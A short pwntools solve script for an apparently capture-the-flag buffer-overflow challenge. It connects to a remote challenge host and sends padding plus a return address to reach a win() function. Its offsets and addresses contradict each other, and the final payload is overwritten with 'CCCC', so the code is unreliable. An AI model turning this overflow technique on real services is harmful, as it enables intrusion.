from pwn import *

# Set the target IP and port
target_ip = 'host3.metaproblems.com'  # Replace with the actual IP address
target_port = 6040     # Replace with the actual port

# Start a connection to the target
conn = remote(target_ip, target_port)

# Receive the initial output and prompt for "Name: "
print(conn.recvuntil(b"Name: "))
# conn.recvuntil(b"Name: ")

# Send the name input
conn.sendline(b"BBBB")

# Receive the next prompt asking for the greeting
conn.recvuntil(b"Greeting: ")

# Create the exploit payload
# Example: Offset is 300 bytes, and win function address is 0x0804856a
win_address = p32(0x0804856a)  # Replace with actual address of win() in little-endian format
padding = b'A' * 300           # Adjust this based on your offset to the return address
exploit_payload = padding + win_address

secret_vault_address_bytes = b'A'*358 + b'\x5d\x12\x40\x00\x00\x00\x00\x00'
secret_vault_address_bytes = b"CCCC"
exploit_payload = secret_vault_address_bytes
# Send the exploit payload as the greeting
conn.sendline(exploit_payload)

# Print the result (output from the win() function)
result = conn.recvall()
print(result.decode())

# Close the connection
conn.close()



